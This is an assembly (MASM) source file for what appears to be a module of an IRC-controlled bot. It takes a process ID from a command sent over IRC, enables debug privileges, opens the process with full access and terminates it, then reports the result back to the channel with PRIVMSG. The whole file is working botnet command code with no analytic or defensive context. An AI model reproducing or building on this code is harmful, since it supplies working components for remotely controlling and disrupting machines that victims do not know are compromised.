;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc
includes    ..\..\common\misc.inc, getprivileges.asm

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
pkill   proc    lpszline
    local   dwsocket, szmsgbuffer[1024]:byte, szreply[64]:byte, szbuffer1[64]:byte
    local   hsnap, pe:PROCESSENTRY32, dwpid:dword
    
    mov     eax, lpbot_info
    m2m     dwsocket, (sbot_data ptr [eax]).dwsocket
    
    ; debug privileges (to kill procesess)
    .if     !dwinitialized
        invoke  getprivileges
        .if     eax != -1
            mov     dwinitialized, TRUE
        .endif
    .endif

    ; to respond to. channel or user
    invoke  get_token, addr szbuffer1, lpszline, ' ', 0, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ':', 1, FALSE
    invoke  get_token, addr szbuffer1, addr szbuffer1, '!', 0, FALSE
    
    invoke  get_token, addr szreply, lpszline, ' ', 2, FALSE
    .if     byte ptr szreply != '#'
        invoke  xcopy, addr szreply, addr szbuffer1, sizeof szbuffer1
    .endif
    
    ; which one?
    invoke  get_token, addr szbuffer1, lpszline, ':', 2, TRUE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ' ', 1, TRUE
    invoke  get_token, addr szbuffer1, addr szbuffer1, '-', 0, TRUE
    invoke  get_token, addr szbuffer1, addr szbuffer1, ' ', 1, TRUE
    invoke  printf, SADD("process id: %s"), addr szbuffer1
    
    invoke  atodw, addr szbuffer1
    mov     dwpid, eax

    ; showing it
    invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[+] Looking for process...")
    invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0

    invoke  CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0
	mov     hsnap, eax
	.if     eax

        mov     pe.dwSize, sizeof PROCESSENTRY32
        invoke  Process32First, hsnap, addr pe
        
        mov     ebx, dwpid
        .while     eax

            .if     pe.th32ProcessID == ebx
               
                invoke  OpenProcess, PROCESS_ALL_ACCESS, 0, pe.th32ProcessID
                .if     eax
                    invoke  TerminateProcess, eax, 0
                    mov     eax, -1
                    .break
                .endif

            .endif

            invoke  Process32Next, hsnap, addr pe
        
        .endw
	
	.else

        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[-] Fail to list processes")
        invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0

	.endif

    .if     eax == -1
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[+] Process killed")   
    .else
        invoke  wsprintf, addr szmsgbuffer, SADD('PRIVMSG %s :%s', EOL), addr szreply, SADD("[-] Process not found")   
        
    .endif
    invoke  send, dwsocket, addr szmsgbuffer, FUNC(lstrlen, addr szmsgbuffer), 0
    invoke  CloseHandle, hsnap
    
    ret
pkill   endp

;-----------------------------------------------------------------------
ibm_init    proc    lpsbot_data
    
    m2m     lpbot_info, lpsbot_data
    mov     eax, offset mdt
    
    ret
ibm_init    endp

end
;-----------------------------------------------------------------------
